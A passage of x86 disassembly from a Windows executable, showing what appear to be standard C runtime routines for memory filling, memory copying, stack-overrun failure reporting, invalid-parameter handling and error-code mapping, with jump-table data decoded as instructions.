  403bfc:	33 c0                	xor    %eax,%eax
  403bfe:	8a 44 24 08          	mov    0x8(%esp),%al
  403c02:	84 c0                	test   %al,%al
  403c04:	75 16                	jne    0x403c1c
  403c06:	81 fa 80 00 00 00    	cmp    $0x80,%edx
  403c0c:	72 0e                	jb     0x403c1c
  403c0e:	83 3d 5c 27 41 00 00 	cmpl   $0x0,0x41275c
  403c15:	74 05                	je     0x403c1c
  403c17:	e9 e6 2d 00 00       	jmp    0x406a02
  403c1c:	57                   	push   %edi
  403c1d:	8b f9                	mov    %ecx,%edi
  403c1f:	83 fa 04             	cmp    $0x4,%edx
  403c22:	72 31                	jb     0x403c55
  403c24:	f7 d9                	neg    %ecx
  403c26:	83 e1 03             	and    $0x3,%ecx
  403c29:	74 0c                	je     0x403c37
  403c2b:	2b d1                	sub    %ecx,%edx
  403c2d:	88 07                	mov    %al,(%edi)
  403c2f:	83 c7 01             	add    $0x1,%edi
  403c32:	83 e9 01             	sub    $0x1,%ecx
  403c35:	75 f6                	jne    0x403c2d
  403c37:	8b c8                	mov    %eax,%ecx
  403c39:	c1 e0 08             	shl    $0x8,%eax
  403c3c:	03 c1                	add    %ecx,%eax
  403c3e:	8b c8                	mov    %eax,%ecx
  403c40:	c1 e0 10             	shl    $0x10,%eax
  403c43:	03 c1                	add    %ecx,%eax
  403c45:	8b ca                	mov    %edx,%ecx
  403c47:	83 e2 03             	and    $0x3,%edx
  403c4a:	c1 e9 02             	shr    $0x2,%ecx
  403c4d:	74 06                	je     0x403c55
  403c4f:	f3 ab                	rep stos %eax,%es:(%edi)
  403c51:	85 d2                	test   %edx,%edx
  403c53:	74 0a                	je     0x403c5f
  403c55:	88 07                	mov    %al,(%edi)
  403c57:	83 c7 01             	add    $0x1,%edi
  403c5a:	83 ea 01             	sub    $0x1,%edx
  403c5d:	75 f6                	jne    0x403c55
  403c5f:	8b 44 24 08          	mov    0x8(%esp),%eax
  403c63:	5f                   	pop    %edi
  403c64:	c3                   	ret
  403c65:	8b 44 24 04          	mov    0x4(%esp),%eax
  403c69:	c3                   	ret
  403c6a:	8b ff                	mov    %edi,%edi
  403c6c:	55                   	push   %ebp
  403c6d:	8b ec                	mov    %esp,%ebp
  403c6f:	81 ec 28 03 00 00    	sub    $0x328,%esp
  403c75:	a3 48 09 41 00       	mov    %eax,0x410948
  403c7a:	89 0d 44 09 41 00    	mov    %ecx,0x410944
  403c80:	89 15 40 09 41 00    	mov    %edx,0x410940
  403c86:	89 1d 3c 09 41 00    	mov    %ebx,0x41093c
  403c8c:	89 35 38 09 41 00    	mov    %esi,0x410938
  403c92:	89 3d 34 09 41 00    	mov    %edi,0x410934
  403c98:	66 8c 15 60 09 41 00 	data16 mov %ss,0x410960
  403c9f:	66 8c 0d 54 09 41 00 	data16 mov %cs,0x410954
  403ca6:	66 8c 1d 30 09 41 00 	data16 mov %ds,0x410930
  403cad:	66 8c 05 2c 09 41 00 	data16 mov %es,0x41092c
  403cb4:	66 8c 25 28 09 41 00 	data16 mov %fs,0x410928
  403cbb:	66 8c 2d 24 09 41 00 	data16 mov %gs,0x410924
  403cc2:	9c                   	pushf
  403cc3:	8f 05 58 09 41 00    	pop    0x410958
  403cc9:	8b 45 00             	mov    0x0(%ebp),%eax
  403ccc:	a3 4c 09 41 00       	mov    %eax,0x41094c
  403cd1:	8b 45 04             	mov    0x4(%ebp),%eax
  403cd4:	a3 50 09 41 00       	mov    %eax,0x410950
  403cd9:	8d 45 08             	lea    0x8(%ebp),%eax
  403cdc:	a3 5c 09 41 00       	mov    %eax,0x41095c
  403ce1:	8b 85 e0 fc ff ff    	mov    -0x320(%ebp),%eax
  403ce7:	c7 05 98 08 41 00 01 	movl   $0x10001,0x410898
  403cee:	00 01 00 
  403cf1:	a1 50 09 41 00       	mov    0x410950,%eax
  403cf6:	a3 4c 08 41 00       	mov    %eax,0x41084c
  403cfb:	c7 05 40 08 41 00 09 	movl   $0xc0000409,0x410840
  403d02:	04 00 c0 
  403d05:	c7 05 44 08 41 00 01 	movl   $0x1,0x410844
  403d0c:	00 00 00 
  403d0f:	a1 b0 f0 40 00       	mov    0x40f0b0,%eax
  403d14:	89 85 d8 fc ff ff    	mov    %eax,-0x328(%ebp)
  403d1a:	a1 b4 f0 40 00       	mov    0x40f0b4,%eax
  403d1f:	89 85 dc fc ff ff    	mov    %eax,-0x324(%ebp)
  403d25:	ff 15 fc b0 40 00    	call   *0x40b0fc
  403d2b:	a3 90 08 41 00       	mov    %eax,0x410890
  403d30:	6a 01                	push   $0x1
  403d32:	e8 32 2e 00 00       	call   0x406b69
  403d37:	59                   	pop    %ecx
  403d38:	6a 00                	push   $0x0
  403d3a:	ff 15 f8 b0 40 00    	call   *0x40b0f8
  403d40:	68 e0 b2 40 00       	push   $0x40b2e0
  403d45:	ff 15 f4 b0 40 00    	call   *0x40b0f4
  403d4b:	83 3d 90 08 41 00 00 	cmpl   $0x0,0x410890
  403d52:	75 08                	jne    0x403d5c
  403d54:	6a 01                	push   $0x1
  403d56:	e8 0e 2e 00 00       	call   0x406b69
  403d5b:	59                   	pop    %ecx
  403d5c:	68 09 04 00 c0       	push   $0xc0000409
  403d61:	ff 15 bc b0 40 00    	call   *0x40b0bc
  403d67:	50                   	push   %eax
  403d68:	ff 15 7c b0 40 00    	call   *0x40b07c
  403d6e:	c9                   	leave
  403d6f:	c3                   	ret
  403d70:	55                   	push   %ebp
  403d71:	8b ec                	mov    %esp,%ebp
  403d73:	57                   	push   %edi
  403d74:	56                   	push   %esi
  403d75:	8b 75 0c             	mov    0xc(%ebp),%esi
  403d78:	8b 4d 10             	mov    0x10(%ebp),%ecx
  403d7b:	8b 7d 08             	mov    0x8(%ebp),%edi
  403d7e:	8b c1                	mov    %ecx,%eax
  403d80:	8b d1                	mov    %ecx,%edx
  403d82:	03 c6                	add    %esi,%eax
  403d84:	3b fe                	cmp    %esi,%edi
  403d86:	76 08                	jbe    0x403d90
  403d88:	3b f8                	cmp    %eax,%edi
  403d8a:	0f 82 a0 01 00 00    	jb     0x403f30
  403d90:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
  403d96:	72 1c                	jb     0x403db4
  403d98:	83 3d 5c 27 41 00 00 	cmpl   $0x0,0x41275c
  403d9f:	74 13                	je     0x403db4
  403da1:	57                   	push   %edi
  403da2:	56                   	push   %esi
  403da3:	83 e7 0f             	and    $0xf,%edi
  403da6:	83 e6 0f             	and    $0xf,%esi
  403da9:	3b fe                	cmp    %esi,%edi
  403dab:	5e                   	pop    %esi
  403dac:	5f                   	pop    %edi
  403dad:	75 05                	jne    0x403db4
  403daf:	e9 c7 07 00 00       	jmp    0x40457b
  403db4:	f7 c7 03 00 00 00    	test   $0x3,%edi
  403dba:	75 14                	jne    0x403dd0
  403dbc:	c1 e9 02             	shr    $0x2,%ecx
  403dbf:	83 e2 03             	and    $0x3,%edx
  403dc2:	83 f9 08             	cmp    $0x8,%ecx
  403dc5:	72 29                	jb     0x403df0
  403dc7:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403dc9:	ff 24 95 e0 3e 40 00 	jmp    *0x403ee0(,%edx,4)
  403dd0:	8b c7                	mov    %edi,%eax
  403dd2:	ba 03 00 00 00       	mov    $0x3,%edx
  403dd7:	83 e9 04             	sub    $0x4,%ecx
  403dda:	72 0c                	jb     0x403de8
  403ddc:	83 e0 03             	and    $0x3,%eax
  403ddf:	03 c8                	add    %eax,%ecx
  403de1:	ff 24 85 f4 3d 40 00 	jmp    *0x403df4(,%eax,4)
  403de8:	ff 24 8d f0 3e 40 00 	jmp    *0x403ef0(,%ecx,4)
  403def:	90                   	nop
  403df0:	ff 24 8d 74 3e 40 00 	jmp    *0x403e74(,%ecx,4)
  403df7:	90                   	nop
  403df8:	04 3e                	add    $0x3e,%al
  403dfa:	40                   	inc    %eax
  403dfb:	00 30                	add    %dh,(%eax)
  403dfd:	3e 40                	ds inc %eax
  403dff:	00 54 3e 40          	add    %dl,0x40(%esi,%edi,1)
  403e03:	00 23                	add    %ah,(%ebx)
  403e05:	d1 8a 06 88 07 8a    	rorl   $1,-0x75f877fa(%edx)
  403e0b:	46                   	inc    %esi
  403e0c:	01 88 47 01 8a 46    	add    %ecx,0x468a0147(%eax)
  403e12:	02 c1                	add    %cl,%al
  403e14:	e9 02 88 47 02       	jmp    0x287c61b
  403e19:	83 c6 03             	add    $0x3,%esi
  403e1c:	83 c7 03             	add    $0x3,%edi
  403e1f:	83 f9 08             	cmp    $0x8,%ecx
  403e22:	72 cc                	jb     0x403df0
  403e24:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403e26:	ff 24 95 e0 3e 40 00 	jmp    *0x403ee0(,%edx,4)
  403e2d:	8d 49 00             	lea    0x0(%ecx),%ecx
  403e30:	23 d1                	and    %ecx,%edx
  403e32:	8a 06                	mov    (%esi),%al
  403e34:	88 07                	mov    %al,(%edi)
  403e36:	8a 46 01             	mov    0x1(%esi),%al
  403e39:	c1 e9 02             	shr    $0x2,%ecx
  403e3c:	88 47 01             	mov    %al,0x1(%edi)
  403e3f:	83 c6 02             	add    $0x2,%esi
  403e42:	83 c7 02             	add    $0x2,%edi
  403e45:	83 f9 08             	cmp    $0x8,%ecx
  403e48:	72 a6                	jb     0x403df0
  403e4a:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403e4c:	ff 24 95 e0 3e 40 00 	jmp    *0x403ee0(,%edx,4)
  403e53:	90                   	nop
  403e54:	23 d1                	and    %ecx,%edx
  403e56:	8a 06                	mov    (%esi),%al
  403e58:	88 07                	mov    %al,(%edi)
  403e5a:	83 c6 01             	add    $0x1,%esi
  403e5d:	c1 e9 02             	shr    $0x2,%ecx
  403e60:	83 c7 01             	add    $0x1,%edi
  403e63:	83 f9 08             	cmp    $0x8,%ecx
  403e66:	72 88                	jb     0x403df0
  403e68:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403e6a:	ff 24 95 e0 3e 40 00 	jmp    *0x403ee0(,%edx,4)
  403e71:	8d 49 00             	lea    0x0(%ecx),%ecx
  403e74:	d7                   	xlat   %ds:(%ebx)
  403e75:	3e 40                	ds inc %eax
  403e77:	00 c4                	add    %al,%ah
  403e79:	3e 40                	ds inc %eax
  403e7b:	00 bc 3e 40 00 b4 3e 	add    %bh,0x3eb40040(%esi,%edi,1)
  403e82:	40                   	inc    %eax
  403e83:	00 ac 3e 40 00 a4 3e 	add    %ch,0x3ea40040(%esi,%edi,1)
  403e8a:	40                   	inc    %eax
  403e8b:	00 9c 3e 40 00 94 3e 	add    %bl,0x3e940040(%esi,%edi,1)
  403e92:	40                   	inc    %eax
  403e93:	00 8b 44 8e e4 89    	add    %cl,-0x761b71bc(%ebx)
  403e99:	44                   	inc    %esp
  403e9a:	8f                   	(bad)
  403e9b:	e4 8b                	in     $0x8b,%al
  403e9d:	44                   	inc    %esp
  403e9e:	8e e8                	mov    %eax,%gs
  403ea0:	89 44 8f e8          	mov    %eax,-0x18(%edi,%ecx,4)
  403ea4:	8b 44 8e ec          	mov    -0x14(%esi,%ecx,4),%eax
  403ea8:	89 44 8f ec          	mov    %eax,-0x14(%edi,%ecx,4)
  403eac:	8b 44 8e f0          	mov    -0x10(%esi,%ecx,4),%eax
  403eb0:	89 44 8f f0          	mov    %eax,-0x10(%edi,%ecx,4)
  403eb4:	8b 44 8e f4          	mov    -0xc(%esi,%ecx,4),%eax
  403eb8:	89 44 8f f4          	mov    %eax,-0xc(%edi,%ecx,4)
  403ebc:	8b 44 8e f8          	mov    -0x8(%esi,%ecx,4),%eax
  403ec0:	89 44 8f f8          	mov    %eax,-0x8(%edi,%ecx,4)
  403ec4:	8b 44 8e fc          	mov    -0x4(%esi,%ecx,4),%eax
  403ec8:	89 44 8f fc          	mov    %eax,-0x4(%edi,%ecx,4)
  403ecc:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  403ed3:	03 f0                	add    %eax,%esi
  403ed5:	03 f8                	add    %eax,%edi
  403ed7:	ff 24 95 e0 3e 40 00 	jmp    *0x403ee0(,%edx,4)
  403ede:	8b ff                	mov    %edi,%edi
  403ee0:	f0 3e 40             	lock ds inc %eax
  403ee3:	00 f8                	add    %bh,%al
  403ee5:	3e 40                	ds inc %eax
  403ee7:	00 04 3f             	add    %al,(%edi,%edi,1)
  403eea:	40                   	inc    %eax
  403eeb:	00 18                	add    %bl,(%eax)
  403eed:	3f                   	aas
  403eee:	40                   	inc    %eax
  403eef:	00 8b 45 08 5e 5f    	add    %cl,0x5f5e0845(%ebx)
  403ef5:	c9                   	leave
  403ef6:	c3                   	ret
  403ef7:	90                   	nop
  403ef8:	8a 06                	mov    (%esi),%al
  403efa:	88 07                	mov    %al,(%edi)
  403efc:	8b 45 08             	mov    0x8(%ebp),%eax
  403eff:	5e                   	pop    %esi
  403f00:	5f                   	pop    %edi
  403f01:	c9                   	leave
  403f02:	c3                   	ret
  403f03:	90                   	nop
  403f04:	8a 06                	mov    (%esi),%al
  403f06:	88 07                	mov    %al,(%edi)
  403f08:	8a 46 01             	mov    0x1(%esi),%al
  403f0b:	88 47 01             	mov    %al,0x1(%edi)
  403f0e:	8b 45 08             	mov    0x8(%ebp),%eax
  403f11:	5e                   	pop    %esi
  403f12:	5f                   	pop    %edi
  403f13:	c9                   	leave
  403f14:	c3                   	ret
  403f15:	8d 49 00             	lea    0x0(%ecx),%ecx
  403f18:	8a 06                	mov    (%esi),%al
  403f1a:	88 07                	mov    %al,(%edi)
  403f1c:	8a 46 01             	mov    0x1(%esi),%al
  403f1f:	88 47 01             	mov    %al,0x1(%edi)
  403f22:	8a 46 02             	mov    0x2(%esi),%al
  403f25:	88 47 02             	mov    %al,0x2(%edi)
  403f28:	8b 45 08             	mov    0x8(%ebp),%eax
  403f2b:	5e                   	pop    %esi
  403f2c:	5f                   	pop    %edi
  403f2d:	c9                   	leave
  403f2e:	c3                   	ret
  403f2f:	90                   	nop
  403f30:	8d 74 31 fc          	lea    -0x4(%ecx,%esi,1),%esi
  403f34:	8d 7c 39 fc          	lea    -0x4(%ecx,%edi,1),%edi
  403f38:	f7 c7 03 00 00 00    	test   $0x3,%edi
  403f3e:	75 24                	jne    0x403f64
  403f40:	c1 e9 02             	shr    $0x2,%ecx
  403f43:	83 e2 03             	and    $0x3,%edx
  403f46:	83 f9 08             	cmp    $0x8,%ecx
  403f49:	72 0d                	jb     0x403f58
  403f4b:	fd                   	std
  403f4c:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403f4e:	fc                   	cld
  403f4f:	ff 24 95 7c 40 40 00 	jmp    *0x40407c(,%edx,4)
  403f56:	8b ff                	mov    %edi,%edi
  403f58:	f7 d9                	neg    %ecx
  403f5a:	ff 24 8d 2c 40 40 00 	jmp    *0x40402c(,%ecx,4)
  403f61:	8d 49 00             	lea    0x0(%ecx),%ecx
  403f64:	8b c7                	mov    %edi,%eax
  403f66:	ba 03 00 00 00       	mov    $0x3,%edx
  403f6b:	83 f9 04             	cmp    $0x4,%ecx
  403f6e:	72 0c                	jb     0x403f7c
  403f70:	83 e0 03             	and    $0x3,%eax
  403f73:	2b c8                	sub    %eax,%ecx
  403f75:	ff 24 85 80 3f 40 00 	jmp    *0x403f80(,%eax,4)
  403f7c:	ff 24 8d 7c 40 40 00 	jmp    *0x40407c(,%ecx,4)
  403f83:	90                   	nop
  403f84:	90                   	nop
  403f85:	3f                   	aas
  403f86:	40                   	inc    %eax
  403f87:	00 b4 3f 40 00 dc 3f 	add    %dh,0x3fdc0040(%edi,%edi,1)
  403f8e:	40                   	inc    %eax
  403f8f:	00 8a 46 03 23 d1    	add    %cl,-0x2edcfcba(%edx)
  403f95:	88 47 03             	mov    %al,0x3(%edi)
  403f98:	83 ee 01             	sub    $0x1,%esi
  403f9b:	c1 e9 02             	shr    $0x2,%ecx
  403f9e:	83 ef 01             	sub    $0x1,%edi
  403fa1:	83 f9 08             	cmp    $0x8,%ecx
  403fa4:	72 b2                	jb     0x403f58
  403fa6:	fd                   	std
  403fa7:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403fa9:	fc                   	cld
  403faa:	ff 24 95 7c 40 40 00 	jmp    *0x40407c(,%edx,4)
  403fb1:	8d 49 00             	lea    0x0(%ecx),%ecx
  403fb4:	8a 46 03             	mov    0x3(%esi),%al
  403fb7:	23 d1                	and    %ecx,%edx
  403fb9:	88 47 03             	mov    %al,0x3(%edi)
  403fbc:	8a 46 02             	mov    0x2(%esi),%al
  403fbf:	c1 e9 02             	shr    $0x2,%ecx
  403fc2:	88 47 02             	mov    %al,0x2(%edi)
  403fc5:	83 ee 02             	sub    $0x2,%esi
  403fc8:	83 ef 02             	sub    $0x2,%edi
  403fcb:	83 f9 08             	cmp    $0x8,%ecx
  403fce:	72 88                	jb     0x403f58
  403fd0:	fd                   	std
  403fd1:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403fd3:	fc                   	cld
  403fd4:	ff 24 95 7c 40 40 00 	jmp    *0x40407c(,%edx,4)
  403fdb:	90                   	nop
  403fdc:	8a 46 03             	mov    0x3(%esi),%al
  403fdf:	23 d1                	and    %ecx,%edx
  403fe1:	88 47 03             	mov    %al,0x3(%edi)
  403fe4:	8a 46 02             	mov    0x2(%esi),%al
  403fe7:	88 47 02             	mov    %al,0x2(%edi)
  403fea:	8a 46 01             	mov    0x1(%esi),%al
  403fed:	c1 e9 02             	shr    $0x2,%ecx
  403ff0:	88 47 01             	mov    %al,0x1(%edi)
  403ff3:	83 ee 03             	sub    $0x3,%esi
  403ff6:	83 ef 03             	sub    $0x3,%edi
  403ff9:	83 f9 08             	cmp    $0x8,%ecx
  403ffc:	0f 82 56 ff ff ff    	jb     0x403f58
  404002:	fd                   	std
  404003:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404005:	fc                   	cld
  404006:	ff 24 95 7c 40 40 00 	jmp    *0x40407c(,%edx,4)
  40400d:	8d 49 00             	lea    0x0(%ecx),%ecx
  404010:	30 40 40             	xor    %al,0x40(%eax)
  404013:	00 38                	add    %bh,(%eax)
  404015:	40                   	inc    %eax
  404016:	40                   	inc    %eax
  404017:	00 40 40             	add    %al,0x40(%eax)
  40401a:	40                   	inc    %eax
  40401b:	00 48 40             	add    %cl,0x40(%eax)
  40401e:	40                   	inc    %eax
  40401f:	00 50 40             	add    %dl,0x40(%eax)
  404022:	40                   	inc    %eax
  404023:	00 58 40             	add    %bl,0x40(%eax)
  404026:	40                   	inc    %eax
  404027:	00 60 40             	add    %ah,0x40(%eax)
  40402a:	40                   	inc    %eax
  40402b:	00 73 40             	add    %dh,0x40(%ebx)
  40402e:	40                   	inc    %eax
  40402f:	00 8b 44 8e 1c 89    	add    %cl,-0x76e371bc(%ebx)
  404035:	44                   	inc    %esp
  404036:	8f                   	(bad)
  404037:	1c 8b                	sbb    $0x8b,%al
  404039:	44                   	inc    %esp
  40403a:	8e 18                	mov    (%eax),%ds
  40403c:	89 44 8f 18          	mov    %eax,0x18(%edi,%ecx,4)
  404040:	8b 44 8e 14          	mov    0x14(%esi,%ecx,4),%eax
  404044:	89 44 8f 14          	mov    %eax,0x14(%edi,%ecx,4)
  404048:	8b 44 8e 10          	mov    0x10(%esi,%ecx,4),%eax
  40404c:	89 44 8f 10          	mov    %eax,0x10(%edi,%ecx,4)
  404050:	8b 44 8e 0c          	mov    0xc(%esi,%ecx,4),%eax
  404054:	89 44 8f 0c          	mov    %eax,0xc(%edi,%ecx,4)
  404058:	8b 44 8e 08          	mov    0x8(%esi,%ecx,4),%eax
  40405c:	89 44 8f 08          	mov    %eax,0x8(%edi,%ecx,4)
  404060:	8b 44 8e 04          	mov    0x4(%esi,%ecx,4),%eax
  404064:	89 44 8f 04          	mov    %eax,0x4(%edi,%ecx,4)
  404068:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  40406f:	03 f0                	add    %eax,%esi
  404071:	03 f8                	add    %eax,%edi
  404073:	ff 24 95 7c 40 40 00 	jmp    *0x40407c(,%edx,4)
  40407a:	8b ff                	mov    %edi,%edi
  40407c:	8c 40 40             	mov    %es,0x40(%eax)
  40407f:	00 94 40 40 00 a4 40 	add    %dl,0x40a40040(%eax,%eax,2)
  404086:	40                   	inc    %eax
  404087:	00 b8 40 40 00 8b    	add    %bh,-0x74ffbfc0(%eax)
  40408d:	45                   	inc    %ebp
  40408e:	08 5e 5f             	or     %bl,0x5f(%esi)
  404091:	c9                   	leave
  404092:	c3                   	ret
  404093:	90                   	nop
  404094:	8a 46 03             	mov    0x3(%esi),%al
  404097:	88 47 03             	mov    %al,0x3(%edi)
  40409a:	8b 45 08             	mov    0x8(%ebp),%eax
  40409d:	5e                   	pop    %esi
  40409e:	5f                   	pop    %edi
  40409f:	c9                   	leave
  4040a0:	c3                   	ret
  4040a1:	8d 49 00             	lea    0x0(%ecx),%ecx
  4040a4:	8a 46 03             	mov    0x3(%esi),%al
  4040a7:	88 47 03             	mov    %al,0x3(%edi)
  4040aa:	8a 46 02             	mov    0x2(%esi),%al
  4040ad:	88 47 02             	mov    %al,0x2(%edi)
  4040b0:	8b 45 08             	mov    0x8(%ebp),%eax
  4040b3:	5e                   	pop    %esi
  4040b4:	5f                   	pop    %edi
  4040b5:	c9                   	leave
  4040b6:	c3                   	ret
  4040b7:	90                   	nop
  4040b8:	8a 46 03             	mov    0x3(%esi),%al
  4040bb:	88 47 03             	mov    %al,0x3(%edi)
  4040be:	8a 46 02             	mov    0x2(%esi),%al
  4040c1:	88 47 02             	mov    %al,0x2(%edi)
  4040c4:	8a 46 01             	mov    0x1(%esi),%al
  4040c7:	88 47 01             	mov    %al,0x1(%edi)
  4040ca:	8b 45 08             	mov    0x8(%ebp),%eax
  4040cd:	5e                   	pop    %esi
  4040ce:	5f                   	pop    %edi
  4040cf:	c9                   	leave
  4040d0:	c3                   	ret
  4040d1:	8b ff                	mov    %edi,%edi
  4040d3:	55                   	push   %ebp
  4040d4:	8b ec                	mov    %esp,%ebp
  4040d6:	8b 45 08             	mov    0x8(%ebp),%eax
  4040d9:	a3 64 0b 41 00       	mov    %eax,0x410b64
  4040de:	5d                   	pop    %ebp
  4040df:	c3                   	ret
  4040e0:	8b ff                	mov    %edi,%edi
  4040e2:	55                   	push   %ebp
  4040e3:	8b ec                	mov    %esp,%ebp
  4040e5:	81 ec 28 03 00 00    	sub    $0x328,%esp
  4040eb:	a1 b0 f0 40 00       	mov    0x40f0b0,%eax
  4040f0:	33 c5                	xor    %ebp,%eax
  4040f2:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4040f5:	53                   	push   %ebx
  4040f6:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4040f9:	57                   	push   %edi
  4040fa:	83 fb ff             	cmp    $0xffffffff,%ebx
  4040fd:	74 07                	je     0x404106
  4040ff:	53                   	push   %ebx
  404100:	e8 64 2a 00 00       	call   0x406b69
  404105:	59                   	pop    %ecx
  404106:	83 a5 e0 fc ff ff 00 	andl   $0x0,-0x320(%ebp)
  40410d:	6a 4c                	push   $0x4c
  40410f:	8d 85 e4 fc ff ff    	lea    -0x31c(%ebp),%eax
  404115:	6a 00                	push   $0x0
  404117:	50                   	push   %eax
  404118:	e8 d3 fa ff ff       	call   0x403bf0
  40411d:	8d 85 e0 fc ff ff    	lea    -0x320(%ebp),%eax
  404123:	89 85 d8 fc ff ff    	mov    %eax,-0x328(%ebp)
  404129:	8d 85 30 fd ff ff    	lea    -0x2d0(%ebp),%eax
  40412f:	83 c4 0c             	add    $0xc,%esp
  404132:	89 85 dc fc ff ff    	mov    %eax,-0x324(%ebp)
  404138:	89 85 e0 fd ff ff    	mov    %eax,-0x220(%ebp)
  40413e:	89 8d dc fd ff ff    	mov    %ecx,-0x224(%ebp)
  404144:	89 95 d8 fd ff ff    	mov    %edx,-0x228(%ebp)
  40414a:	89 9d d4 fd ff ff    	mov    %ebx,-0x22c(%ebp)
  404150:	89 b5 d0 fd ff ff    	mov    %esi,-0x230(%ebp)
  404156:	89 bd cc fd ff ff    	mov    %edi,-0x234(%ebp)
  40415c:	66 8c 95 f8 fd ff ff 	data16 mov %ss,-0x208(%ebp)
  404163:	66 8c 8d ec fd ff ff 	data16 mov %cs,-0x214(%ebp)
  40416a:	66 8c 9d c8 fd ff ff 	data16 mov %ds,-0x238(%ebp)
  404171:	66 8c 85 c4 fd ff ff 	data16 mov %es,-0x23c(%ebp)
  404178:	66 8c a5 c0 fd ff ff 	data16 mov %fs,-0x240(%ebp)
  40417f:	66 8c ad bc fd ff ff 	data16 mov %gs,-0x244(%ebp)
  404186:	9c                   	pushf
  404187:	8f 85 f0 fd ff ff    	pop    -0x210(%ebp)
  40418d:	8b 45 04             	mov    0x4(%ebp),%eax
  404190:	8d 4d 04             	lea    0x4(%ebp),%ecx
  404193:	89 8d f4 fd ff ff    	mov    %ecx,-0x20c(%ebp)
  404199:	c7 85 30 fd ff ff 01 	movl   $0x10001,-0x2d0(%ebp)
  4041a0:	00 01 00 
  4041a3:	89 85 e8 fd ff ff    	mov    %eax,-0x218(%ebp)
  4041a9:	8b 49 fc             	mov    -0x4(%ecx),%ecx
  4041ac:	89 8d e4 fd ff ff    	mov    %ecx,-0x21c(%ebp)
  4041b2:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4041b5:	89 8d e0 fc ff ff    	mov    %ecx,-0x320(%ebp)
  4041bb:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4041be:	89 8d e4 fc ff ff    	mov    %ecx,-0x31c(%ebp)
  4041c4:	89 85 ec fc ff ff    	mov    %eax,-0x314(%ebp)
  4041ca:	ff 15 fc b0 40 00    	call   *0x40b0fc
  4041d0:	6a 00                	push   $0x0
  4041d2:	8b f8                	mov    %eax,%edi
  4041d4:	ff 15 f8 b0 40 00    	call   *0x40b0f8
  4041da:	8d 85 d8 fc ff ff    	lea    -0x328(%ebp),%eax
  4041e0:	50                   	push   %eax
  4041e1:	ff 15 f4 b0 40 00    	call   *0x40b0f4
  4041e7:	85 c0                	test   %eax,%eax
  4041e9:	75 10                	jne    0x4041fb
  4041eb:	85 ff                	test   %edi,%edi
  4041ed:	75 0c                	jne    0x4041fb
  4041ef:	83 fb ff             	cmp    $0xffffffff,%ebx
  4041f2:	74 07                	je     0x4041fb
  4041f4:	53                   	push   %ebx
  4041f5:	e8 6f 29 00 00       	call   0x406b69
  4041fa:	59                   	pop    %ecx
  4041fb:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4041fe:	5f                   	pop    %edi
  4041ff:	33 cd                	xor    %ebp,%ecx
  404201:	5b                   	pop    %ebx
  404202:	e8 77 ee ff ff       	call   0x40307e
  404207:	c9                   	leave
  404208:	c3                   	ret
  404209:	8b ff                	mov    %edi,%edi
  40420b:	56                   	push   %esi
  40420c:	6a 01                	push   $0x1
  40420e:	be 17 04 00 c0       	mov    $0xc0000417,%esi
  404213:	56                   	push   %esi
  404214:	6a 02                	push   $0x2
  404216:	e8 c5 fe ff ff       	call   0x4040e0
  40421b:	83 c4 0c             	add    $0xc,%esp
  40421e:	56                   	push   %esi
  40421f:	ff 15 bc b0 40 00    	call   *0x40b0bc
  404225:	50                   	push   %eax
  404226:	ff 15 7c b0 40 00    	call   *0x40b07c
  40422c:	5e                   	pop    %esi
  40422d:	c3                   	ret
  40422e:	8b ff                	mov    %edi,%edi
  404230:	55                   	push   %ebp
  404231:	8b ec                	mov    %esp,%ebp
  404233:	ff 35 64 0b 41 00    	push   0x410b64
  404239:	ff 15 e8 b0 40 00    	call   *0x40b0e8
  40423f:	85 c0                	test   %eax,%eax
  404241:	74 03                	je     0x404246
  404243:	5d                   	pop    %ebp
  404244:	ff e0                	jmp    *%eax
  404246:	ff 75 18             	push   0x18(%ebp)
  404249:	ff 75 14             	push   0x14(%ebp)
  40424c:	ff 75 10             	push   0x10(%ebp)
  40424f:	ff 75 0c             	push   0xc(%ebp)
  404252:	ff 75 08             	push   0x8(%ebp)
  404255:	e8 af ff ff ff       	call   0x404209
  40425a:	cc                   	int3
  40425b:	33 c0                	xor    %eax,%eax
  40425d:	50                   	push   %eax
  40425e:	50                   	push   %eax
  40425f:	50                   	push   %eax
  404260:	50                   	push   %eax
  404261:	50                   	push   %eax
  404262:	e8 c7 ff ff ff       	call   0x40422e
  404267:	83 c4 14             	add    $0x14,%esp
  40426a:	c3                   	ret
  40426b:	8b ff                	mov    %edi,%edi
  40426d:	55                   	push   %ebp
  40426e:	8b ec                	mov    %esp,%ebp
  404270:	8b 45 08             	mov    0x8(%ebp),%eax
  404273:	33 c9                	xor    %ecx,%ecx
  404275:	3b 04 cd c0 f0 40 00 	cmp    0x40f0c0(,%ecx,8),%eax
  40427c:	74 13                	je     0x404291
  40427e:	41                   	inc    %ecx
  40427f:	83 f9 2d             	cmp    $0x2d,%ecx
  404282:	72 f1                	jb     0x404275
  404284:	8d 48 ed             	lea    -0x13(%eax),%ecx
  404287:	83 f9 11             	cmp    $0x11,%ecx
  40428a:	77 0e                	ja     0x40429a
  40428c:	6a 0d                	push   $0xd
  40428e:	58                   	pop    %eax
  40428f:	5d                   	pop    %ebp
  404290:	c3                   	ret
  404291:	8b 04 cd c4 f0 40 00 	mov    0x40f0c4(,%ecx,8),%eax
  404298:	5d                   	pop    %ebp
  404299:	c3                   	ret
  40429a:	05 44 ff ff ff       	add    $0xffffff44,%eax
  40429f:	6a 0e                	push   $0xe
  4042a1:	59                   	pop    %ecx
  4042a2:	3b c8                	cmp    %eax,%ecx
  4042a4:	1b c0                	sbb    %eax,%eax
  4042a6:	23 c1                	and    %ecx,%eax
  4042a8:	83 c0 08             	add    $0x8,%eax
  4042ab:	5d                   	pop    %ebp
  4042ac:	c3                   	ret
